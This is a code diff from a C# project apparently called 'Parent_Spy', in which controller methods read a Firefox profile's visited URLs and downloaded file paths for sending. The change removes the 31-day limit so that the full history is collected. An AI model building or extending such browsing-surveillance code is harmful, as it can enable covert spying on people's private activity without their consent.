@@ -29,7 +29,7 @@ namespace Parent_Spy.Controllers
         {
             using (var context = new PlacesContext())
             {
-                var sites = context.MozPlaces.AsNoTracking().AsQueryable().Where(x => x.LastVisitDate !=null && (DateTime.Now - (DateTimeOffset.FromUnixTimeSeconds((long)x.LastVisitDate / 1000000).DateTime)).Days <= 31).Select(x => new SiteSendDTO
+                var sites = context.MozPlaces.Where(x => x.LastVisitDate !=null).Select(x => new SiteSendDTO
                 {
                     Url = x.Url,
                     Date = DateTimeOffset.FromUnixTimeSeconds((long)x.LastVisitDate/1000000).DateTime,
@@ -50,7 +50,7 @@ namespace Parent_Spy.Controllers
         {
             using (var context = new PlacesContext())
             {
-                var files = context.MozAnnos.AsNoTracking().AsQueryable().Where(x => x.AnnoAttributeId == 1 && x.DateAdded != null && (DateTime.Now - (DateTimeOffset.FromUnixTimeSeconds((long)x.DateAdded / 1000000).DateTime)).Days <= 31).Select(x => new FileSendDTO
+                var files = context.MozAnnos.Where(x => x.AnnoAttributeId == 1 && x.DateAdded != null).Select(x => new FileSendDTO
                 {
                     FilePath = x.Content,
                     Date = DateTimeOffset.FromUnixTimeSeconds((long)x.DateAdded / 1000000).DateTime,
